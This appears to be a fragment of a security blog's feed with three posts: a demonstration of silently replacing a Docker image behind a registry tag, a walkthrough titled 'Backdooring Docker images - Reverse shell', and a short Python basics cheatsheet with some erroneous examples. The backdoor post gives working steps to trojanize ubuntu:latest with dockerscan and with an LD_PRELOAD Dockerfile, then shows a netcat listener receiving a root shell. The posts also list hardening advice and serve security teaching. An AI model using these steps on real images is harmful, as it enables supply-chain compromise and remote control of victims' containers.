+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker rmi busybox
+docker image tag alpine localhost:5000/busybox
+docker push localhost:5000/busybox
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">The push refers to repository <span style="color:#f92672">[</span>localhost:5000/busybox<span style="color:#f92672">]</span>
+3e207b409db3: Pushed 
+latest: digest: sha256:39eda93d15866957feaee28f8fc5adb545276a64147445c64992ef69804dbf01 size: <span style="color:#ae81ff">528</span>
+</code></pre></div><p>As you see tag name is <code>latest</code> and Digest of the current image starts with <code>39eda93</code></p>
+<p>Let&rsquo;s remove our image of fake <code>busybox</code> from our local repository</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker rmi localhost:5000/busybox:latest
+</code></pre></div><pre><code class="language-console" data-lang="console">Untagged: localhost:5000/busybox:latest
+Untagged: localhost:5000/busybox@sha256:39eda93d15866957feaee28f8fc5adb545276a64147445c64992ef69804dbf01
+</code></pre><p>and pull it from our private registry</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker pull localhost:5000/busybox:latest
+</code></pre></div><pre><code class="language-console" data-lang="console">latest: Pulling from busybox
+Digest: sha256:39eda93d15866957feaee28f8fc5adb545276a64147445c64992ef69804dbf01
+Status: Downloaded newer image for localhost:5000/busybox:latest
+localhost:5000/busybox:latest
+</code></pre><p>Next step to be done is being sure that only digest has not been changed:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker run -it localhost:5000/busybox:latest sh
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/ <span style="color:#75715e"># cat /etc/os-release</span>
+NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Alpine Linux&#34;</span>
+ID<span style="color:#f92672">=</span>alpine
+VERSION_ID<span style="color:#f92672">=</span>3.11.6
+PRETTY_NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Alpine Linux v3.11&#34;</span>
+HOME_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://alpinelinux.org/&#34;</span>
+BUG_REPORT_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://bugs.alpinelinux.org/&#34;</span>
+</code></pre></div><p>As we can see It is an easy way to change docker image in <strong>behind of tag</strong>. <strong>So pullers of specific docker repository wouldn&rsquo;t be able to determine if the image changed.</strong></p>
+<p>Only noticeable thing changed was <code>digests</code> which can be used for image validity check.</p>
+<table>
+<thead>
+<tr>
+<th>IMAGE</th>
+<th>TAG</th>
+<th>DIGIT</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Proper</td>
+<td>LATEST</td>
+<td>c9249fd</td>
+</tr>
+<tr>
+<td>Fake</td>
+<td>LATEST</td>
+<td>39eda93</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2 id="way-to-secure">Way to secure</h2>
+<ul>
+<li>Never download docker images from untrusted repository maintainers</li>
+<li>Limit registry write access to a minimum (In best case only build server)</li>
+<li>Implement <strong>the signing</strong> of docker images (see: <a href="https://github.com/theupdateframework/notary">https://github.com/theupdateframework/notary</a>)</li>
+<li>Be prepared for this possibility:
+<ul>
+<li>Use docker custom security profiles like <strong>AppArmor</strong>, <strong>Seccomp</strong></li>
+<li>Use dynamic analysis tools like Remux</li>
+<li>Don&rsquo;t execute images with excessive privileges (<strong>namespaces</strong>, <strong>privileged flag, added capabilities)</strong></li>
+</ul>
+</li>
+</ul>
+<h3 id="how-to-create-your-own-docker-registry">How to create your own docker registry</h3>
+<p>To run own docker registry you need to have <strong>docker engine version &gt;=1.6.0</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker run -d -p 5000:5000 --name registry registry:2
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Unable to find image <span style="color:#e6db74">&#39;registry:2&#39;</span> locally
+2: Pulling from library/registry
+cbdbe7a5bc2a: Already exists 
+47112e65547d: Pull complete 
+46bcb632e506: Pull complete 
+c1cc712bcecd: Pull complete 
+3db6272dcbfa: Pull complete 
+Digest: sha256:8be26f81ffea54106bae012c6f349df70f4d5e7e2ec01b143c46e2c03b9e551d
+Status: Downloaded newer image <span style="color:#66d9ef">for</span> registry:2
+437d56f489f27e990b6b6e7b43358c670087b5731474a086b52713067056a728
+</code></pre></div><p>Docker registry is simply docker image we run as a container. If everything came fine we should see running docker registry container:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker ps
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES
+437d56f489f2        registry:2          <span style="color:#e6db74">&#34;/entrypoint.sh /etc…&#34;</span>   <span style="color:#ae81ff">30</span> seconds ago      Up <span style="color:#ae81ff">28</span> seconds       0.0.0.0:5000-&gt;5000/tcp   registry
+</code></pre></div><p>Ok now let be sure that we don&rsquo;t have any repository in our docker registry:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -X GET localhost:5000/v2/_catalog
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{<span style="color:#f92672">&#34;repositories&#34;</span>:[]}
+</code></pre></div><p>Then we can build or retag an image and push into the local registry</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker build .
+docker push localhost:5000/myfirstimage
+</code></pre></div><p>Now let see if our local registry has been updated:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker push localhost:5000/myfirstimage
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">The push refers to repository <span style="color:#f92672">[</span>localhost:5000/myfirstimage<span style="color:#f92672">]</span>
+1079c30efc82: Pushed
+latest: digest: sha256:a7766145a775d39e53a713c75b6fd6d318740e70327aaa3ed5d09e0ef33fc3df size: <span style="color:#ae81ff">527</span>
+</code></pre></div><p>Let&rsquo;s check if the image is placed on the repository:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -X GET localhost:5000/v2/_catalog
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{<span style="color:#f92672">&#34;repositories&#34;</span>:[<span style="color:#e6db74">&#34;myfirstimage&#34;</span>]}
+</code></pre></div><p>and what tags for the image <code>myfirstimage</code> are place in docker repository:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -X GET localhost:5000/v2/myfirstimage/tags/list
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{<span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;myfirstimage&#34;</span>,<span style="color:#f92672">&#34;tags&#34;</span>:[<span style="color:#e6db74">&#34;latest&#34;</span>]}
+</code></pre></div><p>As everything is in place the client can pull the image with the command:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker pull localhost:5000/myfirstimage
+</code></pre></div><p>To stop the process and remove all the data we need to run:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker container stop registry <span style="color:#f92672">&amp;&amp;</span> docker container rm -v registry
+</code></pre></div><h2 id="sources">Sources</h2>
+<ul>
+<li><a href="https://docs.docker.com/registry/">https://docs.docker.com/registry/</a></li>
+<li><a href="https://github.com/theupdateframework/notary">https://github.com/theupdateframework/notary</a></li>
+<li><a href="https://docs.docker.com/engine/security/seccomp/">https://docs.docker.com/engine/security/seccomp/</a></li>
+<li><a href="https://docs.docker.com/engine/security/apparmor/">https://docs.docker.com/engine/security/apparmor/</a></li>
+<li><a href="https://github.com/REMnux/docker">https://github.com/REMnux/docker</a></li>
+<li><a href="https://docs.remnux.org/run-tools-in-containers/remnux-containers">https://docs.remnux.org/run-tools-in-containers/remnux-containers</a></li>
+<li><a href="https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities">https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities</a></li>
+</ul>
+]]></content></item><item><title>Backdooring Docker images - Reverse shell</title><link>/posts/backdooring-docker-images-reverse-shell/</link><pubDate>Sat, 19 Dec 2020 18:51:20 +0100</pubDate><guid>/posts/backdooring-docker-images-reverse-shell/</guid><description>Overview Using trustworthy docker images is one of the most important parts of securing system. Easily, the attacker can prepare a docker image (by changing entrypoint, adding reverse shell or changing running user) and publish a malicious image on docker registry.
+This section shows the way of trojanizing docker images by adding a reverse shell.
+Precondition For the testing purpose, it is needed to have nmap installed:
+sudo apt update sudo apt install -y nmap The next step to be done is the dockerscan installation.</description><content type="html"><![CDATA[<h2 id="overview">Overview</h2>
+<p>Using trustworthy docker images is one of the most important parts of securing system. Easily, the attacker can prepare a docker image (by changing <strong>entrypoint</strong>, adding <strong>reverse shell</strong> or changing <strong>running user</strong>) and publish a malicious image on docker registry.</p>
+<p>This section shows the way of trojanizing docker images by adding a reverse shell.</p>
+<h2 id="precondition">Precondition</h2>
+<p>For the testing purpose, it is needed to have <code>nmap</code> installed:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt update
+sudo apt install -y nmap
+</code></pre></div><p>The next step to be done is the <code>dockerscan</code> installation. It is analysis/hacking tool for docker images.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://github.com/cr0hn/dockerscan
+cd dockerscan
+sudo python3.6 setup.py install
+</code></pre></div><h3 id="preparing-exploited-image---dockerscan">Preparing exploited image - DockerScan</h3>
+<p>The image I choose for exploiting is <code>ubuntu:latest</code>. Let&rsquo;s download it and save it into the backdoor folder.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mkdir backdoor <span style="color:#f92672">&amp;&amp;</span> cd backdoor
+docker pull ubuntu:latest
+docker save ubuntu:latest -o ubuntu-orginal
+</code></pre></div><p>Also, for proper <a href="https://github.com/cr0hn/dockerscan">dockerscan</a> working, we need to set 2 environment variables by placing it to <code>.bashrc</code> file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">export LC_ALL<span style="color:#f92672">=</span>C.UTF-8
+export LANG<span style="color:#f92672">=</span>C.UTF-8
+</code></pre></div><p>Next step is to find IP address of the machine from which we listen for a message from trojanized image. For the purpose of this presentation, I would use docker host IP address in the same machine</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ifconfig docker0
+</code></pre></div><pre><code class="language-console" data-lang="console">docker0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
+        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+        ether 02:42:78:ec:8f:87  txqueuelen 0  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0  
+</code></pre><p>Now we can use <a href="https://github.com/cr0hn/dockerscan">dockerscan</a> trojanize feature to add reverse shell into</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dockerscan image modify trojanize ubuntu-orginal -l 172.17.0.1 -p <span style="color:#ae81ff">8888</span> -o ubuntu-trojanized
+</code></pre></div><pre><code class="language-console" data-lang="console">docker@docker:~/backdoor$ dockerscan image modify trojanize ubuntu-orginal -l 172.17.0.1 -p 8888 -o ubuntu-trojanized
+[ * ] Starting analyzing docker image...
+[ * ] Selected image: 'ubuntu-orginal'
+[ * ] Image trojanized successfully
+[ * ] Trojanized image location:
+[ * ]   &gt; /home/docker/backdoor/ubuntu-trojanized.tar
+[ * ] To receive the reverse shell, only write:
+[ * ]   &gt; nc -v -k -l 172.17.0.1 8888
+docker@docker:~/backdoor$ ls
+ubuntu-orginal  ubuntu-trojanized.tar
+</code></pre><p>Next, it is needed to load the trojanized image:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker load -i ubuntu-trojanized.tar 
+</code></pre></div><p>The result should look like that:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">3d87fd0aaa70: Loading layer <span style="color:#f92672">[==================================================</span>&gt;<span style="color:#f92672">]</span>  30.72kB/30.72kB
+Loaded image: ubuntu:latest
+</code></pre></div><p><strong>The image has been created attacker can run backdoor</strong></p>
+<h3 id="preparing-exploited-image---manual-way">Preparing exploited image - Manual Way</h3>
+<p>DockerScan use <code>LD_PRELOAD</code> , Linux dynamic linker feature to inject malicious reverse shell library. In this section would be shown how to achieve the same result in a manual way.</p>
+<p>Before starting the manual process, let&rsquo;s remove the trojanized image:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker image rm ubuntu:latest --force
+</code></pre></div><h4 id="preparing-dockerfile">Preparing DockerFile</h4>
+<p>We would use the same reverse shell library placed in docker scan GitHub page (<a href="https://github.com/cr0hn/dockerscan/blob/master/dockerscan/actions/image/modifiers/shells/reverse_shell.so">https://github.com/cr0hn/dockerscan/blob/master/dockerscan/actions/image/modifiers/shells/reverse_shell.so</a>).</p>
+<p>Let&rsquo;s prepare <code>DockerFile</code> with <code>revshell</code> inside for the same ubuntu image</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-docker" data-lang="docker"><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> ubuntu:latest</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> reverse_shell.so /usr/share/lib/reverse_shell.so<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENV</span> LD_PRELOAD<span style="color:#f92672">=</span>/usr/share/lib/reverse_shell.so<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENV</span> REMOTE_ADDR<span style="color:#f92672">=</span><span style="color:#ae81ff">172</span>.17.0.1<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENV</span> REMOTE_PORT<span style="color:#f92672">=</span><span style="color:#ae81ff">8888</span>
+
+<span style="color:#66d9ef">CMD</span> [<span style="color:#e6db74">&#34;/bin/bash&#34;</span>]<span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Dockerfile explanation:</p>
+<p>File defined in this environment variable <code>LD_PRELOAD</code> would be loaded <strong>before</strong> any other library (including the C runtime, <code>libc.so</code>). So this runs the reverse shell library before user start his/her shell.</p>
+<p><code>REMOTE_ADDR</code>, <code>REMOTE_PORT</code> - environment variables needed by reverse_shell library</p>
+<p>Now let&rsquo;s build DockerFile</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker build --tag<span style="color:#f92672">=</span>ubuntu .
+</code></pre></div><p>Result:</p>
+<pre><code class="language-console" data-lang="console">docker build --tag=ubuntu .
+Sending build context to Docker daemon  12.29kB
+Step 1/6 : FROM ubuntu:latest
+ ---&gt; d70eaf7277ea
+Step 2/6 : COPY reverse_shell.so /usr/share/lib/reverse_shell.so
+ ---&gt; Using cache
+ ---&gt; 44a9ff4b409f
+Step 3/6 : ENV LD_PRELOAD=/usr/share/lib/reverse_shell.so
+ ---&gt; Using cache
+ ---&gt; acad76bec7fa
+Step 4/6 : ENV REMOTE_ADDR=172.17.0.1
+ ---&gt; Using cache
+ ---&gt; 7f37969b574a
+Step 5/6 : ENV REMOTE_PORT=8888
+ ---&gt; Using cache
+ ---&gt; 4c658bdb781a
+Step 6/6 : CMD [&quot;/bin/bash&quot;]
+ ---&gt; Using cache
+ ---&gt; a984d02509ff
+Successfully built a984d02509ff
+Successfully tagged ubuntu:latest
+</code></pre><p><strong>The image has been created attacker can run backdoor</strong></p>
+<h2 id="running-backdoor">Running backdoor</h2>
+<p>Next step would be to open in <strong>another tab netcat</strong> to listen on the IP we specified before with command:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -v -k -l 172.17.0.1 <span style="color:#ae81ff">8888</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Listening on jacek <span style="color:#ae81ff">8888</span>
+</code></pre></div><p>When <code>netcat</code> is listening from our IP is time to download trojanized container by the victim.</p>
+<p>The last step is to run a shell on the infected image:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker run -it ubuntu:latest /bin/bash
+</code></pre></div><p>When user run trojanized shell <code>netcat</code> listener should connect through <code>reverse shell</code> to malicious container. So the attacker can remotely execute commands on the infected container.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">➜  ~ nc -v -k -l 172.17.0.1 <span style="color:#ae81ff">8888</span>
+Listening on jacek <span style="color:#ae81ff">8888</span>
+Connection received on 172.17.0.2 <span style="color:#ae81ff">36408</span>
+connecting people
+id
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</code></pre></div><h2 id="how-to-secure">How to secure</h2>
+<ul>
+<li>Use private docker register that only your build server produce images</li>
+<li>Never download docker images from untrusted repository maintainers</li>
+<li>Limit registry write access to a minimum (In best case only build server)</li>
+<li>Implement <strong>the signing</strong> of docker images (see: <a href="https://github.com/theupdateframework/notary">https://github.com/theupdateframework/notary</a>)</li>
+<li>Use docker custom security profiles like <strong>AppArmor</strong>, <strong>Seccomp</strong></li>
+<li>Use dynamic analysis tools like Remux</li>
+</ul>
+<h2 id="sources">Sources</h2>
+<ul>
+<li><a href="https://github.com/cr0hn/dockerscan">https://github.com/cr0hn/dockerscan</a></li>
+<li><a href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/">https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/</a></li>
+<li><a href="https://www.slideshare.net/cr0hn/rootedcon-2017-docker-might-not-be-your-friend-trojanizing-docker-images/1">https://www.slideshare.net/cr0hn/rootedcon-2017-docker-might-not-be-your-friend-trojanizing-docker-images/1</a></li>
+<li><a href="https://blog.secureideas.com/2020/10/ld_preload-introduction.html">https://blog.secureideas.com/2020/10/ld_preload-introduction.html</a></li>
+</ul>
+]]></content></item><item><title>Python3 basics cheatsheet</title><link>/posts/python3-basics-cheatsheet/</link><pubDate>Tue, 24 Mar 2020 18:51:20 +0100</pubDate><guid>/posts/python3-basics-cheatsheet/</guid><description>Basic calculations Exponentiation
+2 ** 4 #out 16 Modulo: (Rest of the division)
+5 % 2 #out 1 Variable definition
+var=5 super_crazy_var=5 Comment:
+# Some comment String String definition (In quotes):
+&amp;#34;I can&amp;#39;t touch anything&amp;#34; Print variable:
+print(var) Format method:
+print(&amp;#39;My number is {} and my name is {}&amp;#39;.format(2,&amp;#34;Jan&amp;#34;)) Format method 2:
+print(&amp;#39;My number is {num} and my name is {name} and {num}&amp;#39;.format(num=2,name=&amp;#34;Jan&amp;#34;)) Indexing of strings:
+pintf(s[0]) Slicing: (From 0 to 4)</description><content type="html"><![CDATA[<h2 id="basic-calculations">Basic calculations</h2>
+<p>Exponentiation</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ae81ff">2</span> <span style="color:#f92672">**</span> <span style="color:#ae81ff">4</span> <span style="color:#75715e">#out 16</span>
+</code></pre></div><p>Modulo: (Rest of the division)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ae81ff">5</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#75715e">#out 1</span>
+</code></pre></div><p>Variable definition</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">var<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>
+super_crazy_var<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>
+</code></pre></div><p>Comment:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Some comment</span>
+</code></pre></div><h2 id="string">String</h2>
+<p>String definition (In quotes):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#34;I can&#39;t touch anything&#34;</span>
+</code></pre></div><p>Print variable:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">print</span>(var)
+</code></pre></div><p>Format method:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;My number is {} and my name is {}&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#ae81ff">2</span>,<span style="color:#e6db74">&#34;Jan&#34;</span>))
+</code></pre></div><p>Format method 2:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;My number is {num} and my name is {name} and {num}&#39;</span><span style="color:#f92672">.</span>format(num<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>,name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Jan&#34;</span>))
+</code></pre></div><p>Indexing of strings:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">pintf(s[<span style="color:#ae81ff">0</span>])
+</code></pre></div><p>Slicing: (From 0 to 4)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">s<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Hello world!&#34;</span>
+s[:<span style="color:#ae81ff">4</span>] <span style="color:#75715e">#out &#39;Hell&#39;</span>
+</code></pre></div><h2 id="data-types">Data types</h2>
+<p>Booleans:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">True, False
+</code></pre></div><p>List:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">list <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;b&#39;</span>, <span style="color:#e6db74">&#39;c&#39;</span>]
+</code></pre></div><p>List append:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">list<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#39;d&#39;</span>)
+</code></pre></div><p>Change value in list:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">list[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;new value&#34;</span>
+</code></pre></div><p>Neasted list:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">list <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,[<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,[<span style="color:#e6db74">&#34;double_nested&#34;</span>]]]
+<span style="color:#66d9ef">print</span>(list[<span style="color:#ae81ff">3</span>][<span style="color:#ae81ff">2</span>]) <span style="color:#75715e">#output [&#34;double_neasted&#34;]</span>
+<span style="color:#66d9ef">print</span>(list[<span style="color:#ae81ff">3</span>][<span style="color:#ae81ff">2</span>][<span style="color:#ae81ff">0</span>]) <span style="color:#75715e">#output &#34;double_neasted&#34;</span>
+</code></pre></div><p>Dictionary:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">dic <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;key1&#34;</span>:<span style="color:#e6db74">&#34;value&#34;</span>, <span style="color:#e6db74">&#34;key2&#34;</span>:<span style="color:#ae81ff">1</span>}
+</code></pre></div><p>Neasted Dictionary:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">dic <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;k1&#34;</span>:{<span style="color:#e6db74">&#34;inner_key&#34;</span>:[<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>]}}
+</code></pre></div><p>Touple(Immutable):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">touple <span style="color:#f92672">=</span> (<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>)
+<span style="color:#66d9ef">print</span>(t[<span style="color:#ae81ff">0</span>]) <span style="color:#75715e">#out 1</span>
+</code></pre></div><p>Difference between tuple and list:</p>
+<ul>
+<li>List - Mutable</li>
+<li>Touple - Immutable</li>
+</ul>
+<p>Set(collection of unique elements):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">set<span style="color:#f92672">=</span>{<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>} <span style="color:#75715e">#out {1,2,3}</span>
